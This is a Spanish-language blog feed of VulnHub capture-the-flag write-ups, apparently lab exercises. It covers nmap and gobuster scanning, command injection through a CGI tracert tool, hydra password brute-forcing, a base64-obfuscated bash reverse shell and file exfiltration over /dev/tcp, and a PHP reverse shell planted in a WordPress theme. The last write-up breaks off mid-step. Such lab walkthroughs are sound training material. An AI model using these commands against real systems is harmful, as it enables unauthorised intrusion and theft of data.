<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-19T17:38:27+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">Rickdiculouslyeasy: 1</title><link href="http://localhost:4000/vulnhub/rickdiculouslyeasy/" rel="alternate" type="text/html" title="Rickdiculouslyeasy: 1" /><published>2022-08-14T00:00:00+02:00</published><updated>2022-08-14T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/rickdiculouslyeasy</id><content type="html" xml:base="http://localhost:4000/vulnhub/rickdiculouslyeasy/"><![CDATA[[https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

Realizar un escaneo nmap a la red para buscar el equipo

```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/2.png){: .align-center}

Realizar un escaneo nmap profundo
```bash
sudo nmap -vvv -sS -sV -sC -O -p- -Pn 192.168.122.11 -oG allports
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/3.png){: .align-center}

Se podrá encontrar una flag entre toda la información

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/4.png){: .align-center}

Entrar en la web

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/5.png){: .align-center}

Buscar directorios ocultos en la web, aparecerá un `robots.txt`
```bash
sudo gobuster dir -u 192.168.122.11 -w /usr/share/wordlists/dirb/big.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/6.png){: .align-center}

Ir a `/passwords`, saldrá una flag y un archivo llamado `passwords.html`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/7.png){: .align-center}

Ir a flag, mostrará una de las flags

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/8.png){: .align-center}

Ir a passwords.html

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/9.png){: .align-center}

Mostrar el código fuente, mostrará una contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/10.png){: .align-center}

Ir a `robots.txt` también visto con el gobuster, mostrará tres rutas

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/11.png){: .align-center}

El primer directorio no mostrará nada relevante
Ir al segundo directorio `/cgi-bin-tracertool.cgi`, mostrará una herramienta que servirá para ejecutar un tracert desde la máquina víctima a una IP que sea escrita

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/12.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/13.png){: .align-center}

Al probar a concatenar comandos funcionará. Es importante cerrar el tracert con un punto y coma para seguidamente introducir el comando deseado como se ve en la imagen.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/14.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/15.png){: .align-center}

Tratar de mostrar archivos del equipo, en este caso el `/etc/passwd`

```bash
; tail /etc/pass
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/16.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/17.png){: .align-center}

Aparecerán varios usuarios que añadiremos en un diccionario de usuarios, los usuarios son:

- RickSanchez
- Summer
- Morty
Añadirlos a un diccionario de usuarios del siguiente modo

```bash
cat >> users.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/18.png){: .align-center}

Buscar el usuario al que pertenece la contraseña vista anteriormente en `passwords.html` utilizando hydra y el diccionario creado en el paso anterior, en este caso será al servidor ftp. Saldrá que la contraseña es del usuario `Summer`.

```bash
sudo hydra -L users.txt -p winter 192.168.122.11 ftp
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/19.png){: .align-center}

Entrar por ftp con el usuario `Summer` y la contraseña `winter`

```bash
ftp 192.168.122.11
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/20.png){: .align-center}

Descargar el archivo `FLAG.txt`

```bash
get FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/21.png){: .align-center}

Leer el archivo `FLAG.txt`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/22.png){: .align-center}

Tratar de entrar por ftp de forma anónima

```bash
ftp 192.168.122.11
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/23.png){: .align-center}

Descargar el archivo `FLAG.txt`

```bash
get FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/24.png){: .align-center}

Leer el archivo `FLAG.txt`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/25.png){: .align-center}

Tratar de entrar por ssh con el usuario Summer y la contraseña `winter`. Como se puede ver en los puertos aparecen `22` y `22222`. Esto es porque el servidor SSH ha sido configurado para usar el puerto `22222`, es por esto que habrá que especificarlo.

```bash
ssh Summer@192.168.122.11 -p 22222  
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/26.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/27.png){: .align-center}

Dará acceso al equipo, mostrar el contenido del directorio actual.

```bash
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/28.png){: .align-center}

Al intentar leer el archivo FLAG.txt con el comando cat aparecerá un gato, esto obliga a utilizar otro método para leerlo como puede ser el comando `tail`, `head` o `base64`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/29.png){: .align-center}

Usar `tail` para leer el archivo

```bash
tail FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/30.png){: .align-center}

Ir al directorio anterior y mostrar el contenido para mostrar los directorios personales de los otros usuarios del sistema

```bash
cd ..
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/31.png){: .align-center}

Ir a Morty y mostrar el contenido

```bash
cd Morty/
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/32.png){: .align-center}

Comprobar que el archivo `Safe_Password.jpg` es realmente una imagen

```bash
file Safe_Password.jpg
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/33.png){: .align-center}

Leer el contenido del archivo para comprobar que no haya nada oculto en el código de la imagen , mostrará una contraseña que es `Meeseek`

```bash
head Safe_Password.jpg
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/34.png){: .align-center}

Descomprimir el archivo `journal.txt.zip` con la contraseña Meeseek, mostrará otra flag y también la contraseña para algún archivo que es seguro

```bash
unzip -c journal.txt.zip
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/35.png){: .align-center}

Ir al directorio personal de `RickSanchez` y dentro de él a `RICKS_SAFE/`

```bash
cd ../RickSanchez
ls
cd RICKS_SAFE/
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/36.png){: .align-center}

Al tratar de ejecutar el archivo no será posible por los permisos

```bash
./safe
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/37.png){: .align-center}

Copiar el archivo al directorio personal de Summer

```bash
cp safe ../../Summer/
cd
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/38.png){: .align-center}

Ejecutar el script con la contraseña conseguida anteriormente en el archivo comprimido de Morty. Mostrará una pista para otra contraseña, la pista es que la contraseña cumple los siguientes requisitos:

```bash
./safe 131333
```
- Una letra mayúscula
- Un dígito
- Una de las palabras del nombre de su antigua banda

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/39.png){: .align-center}

Al buscar información sobre su antigua banda se podrá encontrar el nombre de `"The Flesh Curtains"`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/40.png){: .align-center}

Crear un diccionario de contraseñas utilizando `Maskprocessor`, este programa permite crear ficcionarios especificando patrones. (ZSH no rinde bien con caracteres especiales cómo "?", por ello utilizo bash para este paso)

`mp64 ?u?dCurtains      <- ?u Significará una letra mayúscula, ?d Significará un dígito del 0 al 9`

Especificar tanto para los nombres flesh y curtains tanto en mayúscula como en minúscula

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/41.png){: .align-center}

Utilizar `hydra` para encontrar la contraseña del usuario RickSanchez con el diccionario creado anteriormente y con el puerto 22222. Después de un tiempo mostrará la contraseña del usuario RickSanchez

```bash
sudo hydra -t 64 -l RickSanchez -P names.txt 192.168.122.11 ssh -s 22222
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/42.png){: .align-center}

Cambiar al usuario RickSanshez

```bash
su RickSanchez
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/43.png){: .align-center}

Ver los permisos de RickSanchez, mostrará que tiene todos los permisos

```bash
sudo -l
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/44.png){: .align-center}

Cambiar al usuario root

```bash
sudo su
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/45.png){: .align-center}

Ir al directorio /root y mostrar el contenido

```bash
cd /root
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/46.png){: .align-center}

Leer el archivo FLAG.txt

```bash
tail FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/47.png){: .align-center}

Puede encontrarse otra flag accediendo a le web con el puerto `9090`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/48.png){: .align-center}

## Flags

FLAG:{TheyFoundMyBackDoorMorty}-10Points\n")

FLAG{Yeah d- just don't do it.} - 10 Points

FLAG{Whoa this is unexpected} - 10 Points

FLAG{Get off the high road Summer!} - 10 Points

FLAG: {131333} - 20 Points

FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

FLAG: {Ionic Defibrillator} - 30 points

FLAG {There is no Zeus, in your face!} - 10 Points  

Total 120/130]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Rickdiculouslyeasy: 1.]]></summary></entry><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[[https://www.vulnhub.com/entry/the-planets-earth,755/](https://www.vulnhub.com/entry/the-planets-earth,755/)

Realizar un escaneo nmap a la red para buscar el equipo
```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/2.png){: .align-center}

Realizar un escaneo nmap profundo a la IP que aparece
```bash
sudo nmap -vvv -sS -sV -O  -p- --min-rate 5000 --script vuln -Pn 192.168.122.11 -oG allports
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/3.png){: .align-center}

Aparecerán los puertos `22,80,443` abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/4.png){: .align-center}

Aparecerán bastantes vulnerabilidades, entre ellas se mostrarán dos DNS que habra que poner en `/etc/hosts` apuntando a la IP de la máquina victima

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/5.png){: .align-center}

Editar el archivo `/etc/hosts` para añadir las DNS
```bash
sudo nano /etc/hosts
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/6.png){: .align-center}

Entrar a la web como `earth.local`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/7.png){: .align-center}

Realizar un escaneo con gobuster a ambas DNS como https
```bash
sudo gobuster dir -u https://earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/8.png){: .align-center}

```bash
sudo gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/9.png){: .align-center}

Reportará que hay un `robots.txt`, acceder a él. Mostrará una lista de directorios.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/10.png){: .align-center}

Ir a `/testingnotes.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/11.png){: .align-center}

Ir a `testdata.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/12.png){: .align-center}

Usar cyberchef para desencriptar los mensajes de earth.local usando como clave el texto de `testdata.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/13.png){: .align-center}

Mostrará un menaje repetido bastantes veces que es earthclimatechangebad4humans
Usar ese resultado como contraseña en `earth.local/admin/login`

```bash
Usuario: terra
Contraseña: earthclimatechangebad4humans
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/14.png){: .align-center}

Al intentar hacer un reverse shell mostrará que no están permitidas las conexiones, esto es porque detecta que se está introduciendo un comando de reverse shell
```bash
/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/15.png){: .align-center}

Encriptar el comando con base64
```bash
echo "/bin/bash -i >& /dev/tcp/192.168.122.13/4444 0>&1" | base64
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/16.png){: .align-center}

Poner el puerto en escucha
```bash
nc -lvnp 4444
```

IMPORTANTE: Utilizo `ncwrap` que es un alias que he asignado al comando "`rlwrap nc`", para poder usar un shell inverso mejorado.

Para poder usarlo instalar `rlwrap` con `sudo apt install -y rlwrap` y opcionalmente crear un alias que al escribirlo ejecute "`rlwrap nc`"

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/17.png){: .align-center}

Mandar ese comando encriptado indicando que después se desencripte y ejecute

```bash
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTIyLjEzLzQ0NDQgMD4mMQo=' | base64 -d | bash
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/18.png){: .align-center}

Se abrirá un shell inverso

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/19.png){: .align-center}

Al ir a `/var` se podrá ver un directorio llamado `earth_web`
```bash
cd /var
ls –la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/20.png){: .align-center}

Ir a `earth_web` y mostrar el contenido
```bash
cd earth_web
ls -la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/21.png){: .align-center}

Leer el archivo `user_flag.txt`
```bash
cat user_flag.txt
Flag: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/22.png){: .align-center}

Buscar archivos en el sistema con permisos especiales para el usuario actual
```bash
find / -perm -u=s 2>/dev/null
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/23.png){: .align-center}

Saldrá un archivo llamado `reset_root`, al ejecutarlo mostrará un error

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/24.png){: .align-center}

Al intentar hacer un `cat` al archivo este será ilegible

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/25.png){: .align-center}

Por esto será necesario mandar el archivo al equipo atacante para poder revisarlo.

Primero se pondrá un puerto en escucha esperando por la información del archivo y que lo guardará en el equipo:
```bash
nc -nlvp 9002 > reset_root
```

Luego mandar el archivo:
```bash
cat /usr/bin/reset_root > /dev/tcp/192.168.122.13/9002
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/26.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/27.png){: .align-center}

Se recibirá correctamente y el `nc` se cerrará

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/28.png){: .align-center}

Dar permisos de ejecución al archivo `reset_root`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/29.png){: .align-center}

Asegurar que se tiene instalado `strace`, si no instalarlo
```bash
sudo apt install –y strace
```

Comprobar el contenido del archivo `reset_root`
```bash
strace -f ./reset_root
```

Entre todo el contenido mostrará unas líneas que comprueban si existen unos archivos, de existir entonces el script cambia la contraseña del usuario root.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/30.png){: .align-center}

Crear los archivos en el equipo víctima
```bash
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/31.png){: .align-center}

Ejecutar de nuevo el archivo `reset_root`
```bash
/usr/bin/reset_root
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/32.png){: .align-center}

Ahora habrá cambiado la contraseña de `root` a `Earth`

Cambiar al usuario `root` con la contraseña `Earth`
```bash
su
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/33.png){: .align-center}

Comprobar que el usuario es root
```bash
whoami
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/34.png){: .align-center}

Ir al directorio de root y mostrar el contenido
```bash
cd /root
ls –la
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/35.png){: .align-center}

Leer el archivo `root_flag.txt`
```bash
cat root_flag.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/earth/36.png){: .align-center}

## Flags

Usuario: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]

Root: [root_flag_b0da9554d29db2117b02aa8b66ec492e]]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de The Planets: Earth.]]></summary></entry><entry><title type="html">Odin 1</title><link href="http://localhost:4000/vulnhub/odin1/" rel="alternate" type="text/html" title="Odin 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/odin1</id><content type="html" xml:base="http://localhost:4000/vulnhub/odin1/"><![CDATA[[https://www.vulnhub.com/entry/odin-1,619//](https://www.vulnhub.com/entry/odin-1,619/)


```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/1.png){: .align-center}

Aparecerá una máquina con el puerto 80 abierto

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/2.png){: .align-center}

Aparecerá una máquina con el puerto 80 abierto

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/3.png){: .align-center}

Editar el archivo `/etc/host` y añadir la ip de la máquina con su respectivo DNS

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/4.png){: .align-center}

Hacer click en el primer artículo y pasarlo por dcode.fr

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/5.png){: .align-center}

Saldrá que está cifrado en Base32

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/6.png){: .align-center}

Usar el descifrador de Base32, pondrá un enlace que lleva al repositorio de SecLists, específicamente al wordlist de rockyou

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/7.png){: .align-center}

Realizar el mismo proceso con el siguiente texto

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/8.png){: .align-center}

Saldrá que es Base64, descifrarlo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/9.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/10.png){: .align-center}

Y por último con el comentario del artículo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/11.png){: .align-center}

Saldrá que es brainfuck

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/12.png){: .align-center}

No mostrará nada relevante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/13.png){: .align-center}

Ir al login de la web y probar un usuario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/14.png){: .align-center}

Mostrará que el usuario no existe

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/15.png){: .align-center}

Probar con admin, mostrará que el usuario existe pero la contraseña es incorrecta

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/16.png){: .align-center}

Usar wpcan para encontrar la contraseña del usuario admin utilizando el wordlist de rockyou

```bash
sudo wpscan --192.168.122.6 --usernames admin -P /usr/share/wordlists/rockyou.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/17.png){: .align-center}

Encontrará una contraseña para el usuario admin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/18.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/19.png){: .align-center}

Entrar al panel de control de wordpress con el usuario admin y la contraseña que ha mostrado wpscan

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/20.png){: .align-center}

Dará acceso al panel de control de la web

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/20.png){: .align-center}

Ir al editor de temas y probar si puede modificarse el tema del error 404
Copiar el contenido de `/usr/share/webshells/php/php-reverse-shell.php`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/21.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/22.png){: .align-center}

Pegarlo en el tema del error 404

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/23.png){: .align-center}

Ver la IP del equipo atacante

ifconfig

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/24.png){: .align-center}

Cambiar el puerto y la ip en el script

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/25.png){: .align-center}

Y aplicar los cambios

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/26.png){: .align-center}

Poner el equipo con el puerto de escucha

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/27.png){: .align-center}

Entrar a una direccion inválida en la web de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/28.png){: .align-center}

Abrirá una shell inversa

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/29.png){: .align-center}

Ir al home de los usuarios y mostrar contenido, no mostrará nada relevante

Ir a /var/www/html/ y mostrar contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/30.png){: .align-center}

Leer el contenido de `wp-config.php`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/31.png){: .align-center}

Mostrará una contraseña cifrada para el usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/32.png){: .align-center}

Copiar la contraseña cifrada y guardarla en un archivo del equipo atacante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/33.png){: .align-center}

Usar `john` para descifrar la contraseña del usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/34.png){: .align-center}

Mostrará una contraseña para el usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/35.png){: .align-center}

Cambiar de usuario a root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/36.png){: .align-center}

Ir al directorio de root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/37.png){: .align-center}

Leer el contenido de `bjorn`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/38.png){: .align-center}

Al desencriptar el mensaje llevará a un vídeo de youtube

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/39.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/40.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Odin 1.]]></summary></entry><entry><title type="html">KBVuln 2</title><link href="http://localhost:4000/vulnhub/kbvuln2/" rel="alternate" type="text/html" title="KBVuln 2" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln2</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln2/"><![CDATA[[https://www.vulnhub.com/entry/kb-vuln-2,562/](https://www.vulnhub.com/entry/kb-vuln-2,562/)

[https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin)

```bash
sudo nmap -vvv -sS -sV -O 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/2.png){: .align-center}

Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/3.png){: .align-center}

Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress
```bash
sudo gobuster dir -u 192.168.122.6 -w /usr/share/dirb/wordlists/common.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/4.png){: .align-center}

Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin
```bash
sudo wpscan --url 192.168.122.6/wordpress -e u
```

Usuario: Anonymous
Contraseña: Vacía

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/5.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/6.png){: .align-center}

Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/7.png){: .align-center}

Buscar usuarios en el sistema, solo encontrará kbadmin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/8.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/9.png){: .align-center}

Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado

```bash
sudo hydra -l kbadmin -P /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/10.png){: .align-center}

Ver directorios compartidos por smb

```bash
smbmap -H  192.168.122.6
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/11.png){: .align-center}

Entrar al directorio de Anonymous y mostrar el contenido

```bash
smbclient -N //192.168.122.6/Anonymous
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/12.png){: .align-center}

Descargar el archivo backup.zip

```bash
